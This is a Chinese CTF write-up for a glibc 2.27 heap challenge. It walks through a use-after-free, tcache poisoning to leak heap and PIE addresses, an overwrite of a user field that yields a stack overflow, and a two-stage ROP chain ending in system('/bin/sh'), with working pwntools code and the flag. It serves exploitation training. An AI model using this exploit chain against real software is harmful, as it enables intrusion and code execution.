# Pizza Delivery Service

## 题目简述

目标是使用 glibc 2.27 的 64 位 PIE ELF，保护为 Full RELRO、No Canary、NX enabled、PIE enabled。程序维护用户对象和最多十个订单，提供新增、编辑、查看、配送和重新登录功能。

`deliver()` 释放订单后只清空 `is_used[idx]`，没有把 `orders[idx]` 置空。配送操作会拒绝再次释放，但 `edit()` 和 `view()` 根本不检查 `is_used`，因此释放后的订单仍可读写，形成完整 UAF。glibc 2.27 的 tcache 尚未启用 Safe-Linking，已释放块开头的 freelist 指针可以直接泄漏和改写。

## 解题过程

### 从 UAF 建立堆泄漏

`struct order` 的用户数据大小为 `0x30`，对应 `0x40` 大小类。申请两个订单并依次释放后，后释放块的 tcache `fd` 指向先释放块。`view()` 把该块开头当作 `address` 字符串输出，因此能够泄漏堆地址：

```python
new(b"1" * 4)
new(b"2" * 4)
delete(1)
delete(2)
heap_leak = u64(show(2)["address"].ljust(8, b"\x00"))
heap = heap_leak & ~0xFFF
```

### 两次 tcache poisoning

第一次通过 `edit()` 改写已释放订单的 `fd`，让后续一次 `malloc(0x30)` 返回到 `current_user->name` 指针字段。把该字段改成另一个订单的 `pizza_type` 字段地址后，主循环打印当前用户名时就会把 PIE 中 `"Cheese"` 字符串的指针当作字符串内容泄漏。用泄漏减去该字符串在 ELF 中的偏移即可恢复 PIE 基址。

第二次 poisoning 把 tcache 目标改成 `current_user` 结构本身，并写入：

```text
name_size = 0xffff
name      = 一个仍可写的有效堆地址
```

`login()` 的局部缓冲区只有 16 字节，却把可控的 `current_user->name_size` 直接作为读取上限：

```c
char buf[MAX_NAME_SIZE];
read_line("", buf, current_user->name_size);
```

因此重新登录时获得稳定的栈溢出。下面是官方利用链中两次 poisoning 的关键结构，具体堆偏移依赖题目提供的 glibc 2.27 和固定分配顺序：

```python
# 第一次：让 current_user->name 指向保存 PIE 字符串指针的位置。
edit(2, p64(heap + 0x268))
new(b"dummy")
new(p64(heap + 0x2C0))

# 第二次：覆盖 current_user 的 name_size 与 name。
delete(3)
edit(3, p64(heap + 0x260))
new(b"dummy")
new(p64(0xFFFF) + p64(heap + 0x280))
```

### 栈 ROP

PIE 基址已知后，第一次栈溢出调用 `puts(puts@GOT)` 泄漏 libc，并返回 `login()` 再读一轮 payload：

```python
payload = flat(
    b"A" * (0x10 + 8),
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.login,
)
```

由泄漏计算 libc 基址，第二阶段再执行 `system("/bin/sh")`。Full RELRO 阻止 GOT 改写，但不妨碍读取 GOT 中已解析的函数地址：

```python
payload = flat(
    b"A" * (0x10 + 8),
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym.system,
)
```

最终读取到：

```text
shellmates{m4N1Pul4t1nG_piz7a_ChunK$!}
```

## 方法总结

本题的主线是“UAF 读写 → tcache poisoning → 业务对象字段覆盖 → 栈溢出 → 两阶段 ROP”。`is_used` 只保护重复释放并不等于修复 UAF；只要悬空指针仍能进入查看或编辑路径，攻击者仍可泄漏 allocator 元数据并控制 freelist。

堆题不能脱离版本照抄偏移。应先固定 glibc、chunk 大小类、tcache 入栈顺序和是否启用 Safe-Linking，再验证每次伪造分配实际落到哪个字段。本题使用 glibc 2.27，因此可以直接写 `fd`；在较新 glibc 上还必须处理 Safe-Linking 编码。Full RELRO 也只改变最终写入落点，本题通过对象字段获得栈溢出，不需要改 GOT。
